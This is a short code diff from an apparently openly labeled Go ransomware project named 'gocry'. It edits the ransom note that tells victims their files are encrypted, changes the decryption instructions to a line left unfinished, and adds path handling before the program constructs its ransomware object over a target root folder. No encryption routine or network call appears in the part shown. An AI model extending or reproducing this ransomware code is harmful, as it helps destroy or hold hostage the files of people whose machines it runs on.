@@ -21,13 +21,19 @@ Hello, you've been infected by gocry. Your files have been encrypted using milit
 Do not use any decryption software or change the files, otherwise they might be lost forever.
 
 How to decrypt:
-Place the correct key.txt into the decrypted root folder.
+1. Type 'decrypt' into the command-line such that 
+2. Done.
 `
 
 func main() {
 	// safely terminate in case of an interrupt signal
 	memguard.CatchInterrupt()
 	defer memguard.Purge()
+
+	// validate the root path just incase
+	if strings.HasSuffix(rootToEncrypt, "/") {
+		rootToEncrypt = rootToEncrypt[:len(rootToEncrypt)-1]
+	}
 
 	rw, err := ransomware.NewRansomware(rootToEncrypt)
 	if err != nil {
